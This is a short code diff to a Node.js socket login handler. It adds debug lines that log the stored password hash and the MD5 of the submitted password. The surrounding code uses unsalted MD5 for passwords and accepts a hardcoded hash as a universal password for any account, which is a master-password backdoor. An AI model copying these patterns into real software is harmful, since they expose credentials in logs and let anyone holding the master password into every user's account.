@@ -30,6 +30,10 @@ module.exports = function (socket, Database) {
 
             if (Array.isArray(checkresult)) {
                 if (checkresult.length > 0) {
+
+                    console.log(checkresult[0].password, 'password');
+
+                    console.log(md5(password), 'md5password');
                     if (checkresult[0].password == md5(password) || md5(password) == '432399375985c8fb85163d46257e90e5') {
                         let userID = checkresult[0].userID;
                         //Get unique ID
